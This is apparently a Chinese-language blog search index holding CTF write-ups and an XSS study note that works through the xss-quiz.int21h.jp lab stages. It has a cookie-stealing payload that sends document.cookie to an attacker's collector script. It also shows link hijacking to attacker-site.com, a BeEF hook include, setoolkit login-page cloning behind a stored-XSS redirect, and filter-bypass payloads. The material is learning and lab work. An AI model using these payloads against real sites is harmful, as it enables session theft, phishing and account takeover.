<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>就差一把钥匙</title>
      <link href="/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/"/>
      <url>/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=b67a6b78-4bb5-4446-b123-ec150d745093" target="_blank" rel="noopener">合天网安实验室靶场：就差一把钥匙</a></p><p>难度：初级</p><a id="more"></a><p>nmap嗅探，得到robots.txt,访问之</p><p><img src="1589039744189.png" alt="1589039744189"></p><p><img src="1589039820913.png" alt="1589039820913"></p><p>再访问console/</p><p><img src="1589039627734.png" alt="1589039627734"></p><p>添加x-forwarded-for: 127.0.0.1,篡改数据后send</p><p><img src="1589039550010.png" alt="1589039550010"></p><p>get flag!</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇的磁带</title>
      <link href="/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/"/>
      <url>/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=367e590e-6019-4673-ad94-2245c3574aff" target="_blank" rel="noopener">合天网安实验室靶场：神奇的磁带</a></p><p>难度：初级</p><a id="more"></a><p>这是一个套娃,下面开始蛇皮~</p><p>浏览器访问</p><p><img src="1589023144205.png" alt="1589023144205"></p><p>burp抓包，cookie值base64解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="built_in">echo</span> cTEyMzQ1Njc4OTBwLi4= | base64 -d</span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="built_in">echo</span> q1234567890p.. | base64</span><br></pre></td></tr></table></figure><p>提交解密后的值</p><p><img src="1589024250067.png" alt="1589024250067"></p><p>告诉我们要提交磁带的英文tape</p><p><img src="1589024264591.png" alt="1589024264591"></p><p>给了个txt文件地址，访问之</p><p><img src="1589023759850.png" alt="1589023759850"></p><p>提交btzhy</p><p><img src="1589024278213.png" alt="1589024278213"></p><p>给了个php页面，访问之</p><p><img src="1589023863272.png" alt="1589023863272"></p><p><img src="1589023887635.png" alt="1589023887635"></p><p>看源码，提示密码两位，生成字典，burp爆破模块，爆破之</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 2 <span class="string">"0123456789"</span> &gt; pwd.txt</span><br></pre></td></tr></table></figure><p>比较响应长度，确认为66</p><p>提交，get flag!</p><p><img src="1589024100690.png" alt="1589024100690"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站脚本攻击</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>xss学习记录</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>又称非持久性XSS，具有一次性。<br>攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。<br>攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。<br>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。</p><h2 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a>cookie介绍</h3><p>某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）</p><p>在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息</p><p>目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。</p><p>服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。</p><p>典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。</p><h3 id="反射xss盗取cookie"><a href="#反射xss盗取cookie" class="headerlink" title="反射xss盗取cookie"></a>反射xss盗取cookie</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://ip/xss_test/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p><p><code>cookie.php</code>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>cookie 接受cookie参数，写入到cookie.txt</p></blockquote><h3 id="利用cookie会话劫持"><a href="#利用cookie会话劫持" class="headerlink" title="利用cookie会话劫持"></a>利用cookie会话劫持</h3><p>burp登录界面修改cookie，成功登录</p><h3 id="劫持会话后的操作"><a href="#劫持会话后的操作" class="headerlink" title="劫持会话后的操作"></a>劫持会话后的操作</h3><p> 1.修改配置文件<br> 2.上传webshell</p><h2 id="篡改网页链接"><a href="#篡改网页链接" class="headerlink" title="篡改网页链接"></a>篡改网页链接</h2><h3 id="js代码讲解"><a href="#js代码讲解" class="headerlink" title="js代码讲解"></a>js代码讲解</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;link.length;j++)&#123;</span><br><span class="line">    link[j].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>window.onload 当窗口加载时，执行匿名函数。<br>使用for循环遍历所有获得的连接a标签</p></blockquote><h3 id="xss篡改链接"><a href="#xss篡改链接" class="headerlink" title="xss篡改链接"></a>xss篡改链接</h3><p>在xss位置输入上面代码</p><h3 id="篡改链接指向流量url"><a href="#篡改链接指向流量url" class="headerlink" title="篡改链接指向流量url"></a>篡改链接指向流量url</h3><p>刷流量，上述代码修改url</p><h3 id="篡改链接指向恶意url"><a href="#篡改链接指向恶意url" class="headerlink" title="篡改链接指向恶意url"></a>篡改链接指向恶意url</h3><p>beef 进行恶意链接生成，以及利用hook.js执行其他命令。<br>kali中终端输入<code>beef-xss</code>启动beef并生成恶意链接,</p><p>开启一个服务器( <code>service apache2 start</code>  )，将下面代码写入到代码（/var/www/index.html）当中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://ip[:port]/hook.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>最后修改url至攻击者的服务器页面，点击即触发。</p><h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><h3 id="盗取用户信息原理"><a href="#盗取用户信息原理" class="headerlink" title="盗取用户信息原理"></a>盗取用户信息原理</h3><p>克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[用户] --&gt; |访问| B[原始站点有存xss漏洞]</span><br><span class="line">B --&gt; |跳转| C[克隆站点]</span><br><span class="line">A --&gt; |输入账号密码|C</span><br><span class="line">C--&gt;|用户输入账号密码|D(成功获取并存储)</span><br></pre></td></tr></table></figure><h3 id="setoolkit工具克隆网站"><a href="#setoolkit工具克隆网站" class="headerlink" title="setoolkit工具克隆网站"></a>setoolkit工具克隆网站</h3><p>万能的社工工具<br>Select from the menu: <code>从菜单中选择:</code></p><p>   1) Social-Engineering Attacks <code>社会工程学攻击</code><br>   2) Penetration Testing (Fast-Track) <code>穿透测试(快速通道)</code><br>   3) Third Party Modules <code>第三方模块</code><br>   4) Update the Social-Engineer Toolkit <code>更新社交工程师工具包</code><br>   5) Update SET configuration <code>更新集合配置</code><br>   6) Help, Credits, and About <code>帮助，学分，等等</code></p><blockquote><p> 选中1<br>    1) Spear-Phishing Attack Vectors <code>鱼叉式钓鱼攻击载体</code><br>    2) Website Attack Vectors <code>网站攻击载体</code><br>    3) Infectious Media Generator <code>感染介质发生器</code><br>    4) Create a Payload and Listener <code>创建一个有效负载和侦听器</code><br>    5) Mass Mailer Attack <code>大规模邮件攻击</code><br>    6) Arduino-Based Attack Vector <code>基于arduino的攻击向量</code><br>    7) Wireless Access Point Attack Vector <code>无线接入点攻击向量</code><br>    8) QRCode Generator Attack Vector <code>QRCode生成器攻击向量</code><br>    9) Powershell Attack Vectors <code>Powershell攻击向量</code><br>    10) Third Party Modules <code>第三方模块</code><br> 选中2<br>    1) Java Applet Attack Method <code>Java Applet攻击方法</code><br>    2) Metasploit Browser Exploit Method <code>Metasploit浏览器利用方法</code><br>    3) Credential Harvester Attack Method <code>凭证收割机攻击方法</code><br>    4) Tabnabbing Attack Method <code>制表攻击法</code><br>    5) Web Jacking Attack Method <code>顶网攻击方法</code><br>    6) Multi-Attack Web Method <code>多攻击Web方法</code><br>    7) HTA Attack Method <code>HTA攻击方法</code><br> 选中3<br>    1) Web Templates <code>网页模板</code><br>    2) Site Cloner <code>现场切割</code><br>    3) Custom Import <code>自定义导入</code><br> 选中2</p></blockquote><p>Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)<br>Enter the url to clone:<code>输入要克隆的站点url</code></p><h3 id="存储xss跳转克隆网站"><a href="#存储xss跳转克隆网站" class="headerlink" title="存储xss跳转克隆网站"></a>存储xss跳转克隆网站</h3><p>xss payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">"http://ip/"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="查看盗取账号和密码"><a href="#查看盗取账号和密码" class="headerlink" title="查看盗取账号和密码"></a>查看盗取账号和密码</h3><p>在setoolkit终端中查看账号密码</p><h2 id="没有过滤的xss"><a href="#没有过滤的xss" class="headerlink" title="没有过滤的xss"></a>没有过滤的xss</h2><h3 id="实验环境介绍"><a href="#实验环境介绍" class="headerlink" title="实验环境介绍"></a>实验环境介绍</h3><p>一个日本安全研究员制作的xss练习靶场<br><a href="https://xss-quiz.int21h.jp/" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/</a><br>在IE浏览器中打开</p><h3 id="闭合文本标签利用xss"><a href="#闭合文本标签利用xss" class="headerlink" title="闭合文本标签利用xss"></a>闭合文本标签利用xss</h3><p>打开审查工具，查看代码</p><blockquote><p>stage #1 </p><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p></blockquote><p>简单payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>闭合payload:  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="属性中的xss"><a href="#属性中的xss" class="headerlink" title="属性中的xss"></a>属性中的xss</h2><h3 id="配置chrome关闭xss-auditor"><a href="#配置chrome关闭xss-auditor" class="headerlink" title="配置chrome关闭xss-auditor"></a>配置chrome关闭xss-auditor</h3><p>右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上<code>--args --disable-xss-auditor</code> ,最后给快捷方式命名，完成。</p><p>之后就不用IE了，改用Chrome。 </p><h3 id="属性中xss发现"><a href="#属性中xss发现" class="headerlink" title="属性中xss发现"></a>属性中xss发现</h3><p>Ctrl+f<br>代码审查</p><blockquote><p>stage #2 </p><p> <a href="http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c</a></p></blockquote><p>属性中xss闭合引入script</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>属性中xss闭合引入事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onmouseover=alert(document.domain);&gt;</span></span><br></pre></td></tr></table></figure><h2 id="选择列表中的xss"><a href="#选择列表中的xss" class="headerlink" title="选择列表中的xss"></a>选择列表中的xss</h2><h3 id="html-select-标签介绍"><a href="#html-select-标签介绍" class="headerlink" title="html select 标签介绍"></a>html select 标签介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;name&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>select&gt;</span><br></pre></td></tr></table></figure><h3 id="表单介绍"><a href="#表单介绍" class="headerlink" title="表单介绍"></a>表单介绍</h3><p>html表单用于搜集不同类型的用户输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"?sid=..."</span> method=<span class="string">"post"</span>&gt;&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure><p>burp测试</p><blockquote><p>stage #3 </p><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d</a></p></blockquote><p>抓取，p2储存在漏洞<br>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2=japan&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="选择参数中的xss"><a href="#选择参数中的xss" class="headerlink" title="选择参数中的xss"></a>选择参数中的xss</h2><h3 id="html表单隐藏参数介绍"><a href="#html表单隐藏参数介绍" class="headerlink" title="html表单隐藏参数介绍"></a>html表单隐藏参数介绍</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"..."</span> value=<span class="string">"..."</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="html中svg介绍"><a href="#html中svg介绍" class="headerlink" title="html中svg介绍"></a>html中svg介绍</h3><p>svg：<br>意为可缩放的矢量图形，使用xml格式定义图像<br>可通过以下标签嵌入html文档：<code>&lt;wmbed&gt;</code>,<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>，也可以使用<code>&lt;svg&gt;</code>标签嵌入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/事件=<span class="string">""</span>&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h3 id="闭合触发xss"><a href="#闭合触发xss" class="headerlink" title="闭合触发xss"></a>闭合触发xss</h3><blockquote><p>stage #4 </p><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c</a></p></blockquote><p>payload: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="限制输入长度的xss"><a href="#限制输入长度的xss" class="headerlink" title="限制输入长度的xss"></a>限制输入长度的xss</h2><h3 id="html-表单文本框介绍"><a href="#html-表单文本框介绍" class="headerlink" title="html 表单文本框介绍"></a>html 表单文本框介绍</h3><p>html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。</p><p>属性介绍：</p><p>value 规定输入字段的初始值</p><p>readonly 规定输入字段为只读</p><p>disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。</p><p>size 规定输入字段的字符</p><p>maxlength 规定输入字段允许的最大长度</p><h3 id="xss-payload长度计算"><a href="#xss-payload长度计算" class="headerlink" title="xss payload长度计算"></a>xss payload长度计算</h3><p>利用python len函数,如下，结果为40字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = <span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(payload)</span><br></pre></td></tr></table></figure><h3 id="浏览器审查工具修改源码"><a href="#浏览器审查工具修改源码" class="headerlink" title="浏览器审查工具修改源码"></a>浏览器审查工具修改源码</h3><blockquote><p>stage #5 </p><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268</a></p></blockquote><p>paylaod: 先修改maxlength</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="payload-触发xss漏洞"><a href="#payload-触发xss漏洞" class="headerlink" title="payload 触发xss漏洞"></a>payload 触发xss漏洞</h3><p>随着安全意识的提高，script可能会被过滤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">" onmouseover="</span>alert(<span class="built_in">document</span>.domain)<span class="string">"</span></span><br></pre></td></tr></table></figure><h2 id="html事件中的xss"><a href="#html事件中的xss" class="headerlink" title="html事件中的xss"></a>html事件中的xss</h2><h3 id="html事件介绍"><a href="#html事件介绍" class="headerlink" title="html事件介绍"></a>html事件介绍</h3><p>在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数</p><h3 id="xss漏洞发现"><a href="#xss漏洞发现" class="headerlink" title="xss漏洞发现"></a>xss漏洞发现</h3><blockquote><p>stage #6 </p><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0</a></p></blockquote><p> 审查代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>+"<span class="attr">132456</span>"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="闭合思路分析"><a href="#闭合思路分析" class="headerlink" title="闭合思路分析"></a>闭合思路分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a</span></span><br></pre></td></tr></table></figure><h3 id="payload触发xss漏洞"><a href="#payload触发xss漏洞" class="headerlink" title="payload触发xss漏洞"></a>payload触发xss漏洞</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onclick="</span>alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="空格分隔属性的xss"><a href="#空格分隔属性的xss" class="headerlink" title="空格分隔属性的xss"></a>空格分隔属性的xss</h2><h3 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h3><blockquote><p>stage #7 </p><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8</a></p></blockquote><h3 id="触发xss"><a href="#触发xss" class="headerlink" title="触发xss"></a>触发xss</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="javascript伪协议的xss"><a href="#javascript伪协议的xss" class="headerlink" title="javascript伪协议的xss"></a>javascript伪协议的xss</h2><h3 id="javascript伪协议介绍"><a href="#javascript伪协议介绍" class="headerlink" title="javascript伪协议介绍"></a>javascript伪协议介绍</h3><p>将js 代码添加到客户端，方法是把它放置在伪协议说明符<code>javascript:</code>后的url中。</p><p>他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用<code>;</code>讲这些语句分隔开</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="keyword">var</span> now = now Data();<span class="string">"&lt;h1&gt;this item&lt;/h1&gt;"</span> + now;</span><br></pre></td></tr></table></figure><p>js 还可以只含有动作，但不返回值得js语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><p>xss漏洞发现并触发</p><p>设置第一无二字符串提交，在响应中寻找。</p><blockquote><p>stage #8 </p><p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>javascript:alert(document.domain)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="utf-7-xss"><a href="#utf-7-xss" class="headerlink" title="utf-7 xss"></a>utf-7 xss</h2><blockquote><p>stage #9 </p><p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456</a></p></blockquote><p>这里的utf-7 现在的浏览器已经移除了这种编码，危害较小</p><p>所以这里取巧：</p><p><img src="xss_stage9.png" alt=""></p><p><img src="xss_stage9_1.png" alt=""></p><p><img src="xss_stage9_2.png" alt=""></p><p>或者 点击跳过这关</p><p><img src="xss_stage.png" alt=""></p><h2 id="绕过过滤domain为空的xss"><a href="#绕过过滤domain为空的xss" class="headerlink" title="绕过过滤domain为空的xss"></a>绕过过滤domain为空的xss</h2><blockquote><p>stage #10 </p><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d</a></p></blockquote><p><img src="xss_stage10.png" alt=""></p><p><img src="xss_stage10_1.png" alt=""></p><p><img src="xss_stage10_2.png" alt=""></p><p><img src="xss_stage10_3.png" alt=""></p><p>domain被过滤，采取双写，编码绕过</p><p>双写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a</span></span><br></pre></td></tr></table></figure><p>这里使用base64编绕过，也可以采用其他</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;script&gt;eval(atob("</span>YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==<span class="string">"));&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过替换script和on事件的xss"><a href="#绕过替换script和on事件的xss" class="headerlink" title="绕过替换script和on事件的xss"></a>绕过替换script和on事件的xss</h2><blockquote><p>stage #11</p><p><a href="https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a</a></p></blockquote><p>在伪协议中带空格仍然能执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;a href="</span>javasc ript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img 